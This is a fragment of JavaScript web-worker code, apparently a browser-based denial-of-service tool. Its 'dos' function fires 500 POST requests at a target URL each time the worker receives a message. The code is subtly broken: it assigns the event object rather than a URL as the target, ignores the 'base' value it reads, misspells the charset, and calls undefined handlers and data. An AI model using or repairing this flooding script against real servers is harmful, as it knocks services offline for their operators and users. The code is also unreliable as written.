// ...
self.addEventListener('message', function (e) {
  target = e 
}, false);
function makeRequest () {
    //make a new URL and request it via POST
    var fullUrl=target
    var httpRequest= new XMLHttpRequest();
    httpRequest.open("POST", fullUrl, true);
    httpRequest.setRequestHeader("Content-Type", "text/plain; charset=uft-8");
    httpRequest.onreadystatechange=infoReceived;
    httpRequest.onerror=err;
    httpRequest.send(post_data);
}
function dos(){
    var i=0;
    for(i=0;i<500;i++){
        makeRequest();
     }
}
self.onmessage=function(e){
    base = e.data;
    dos();
}
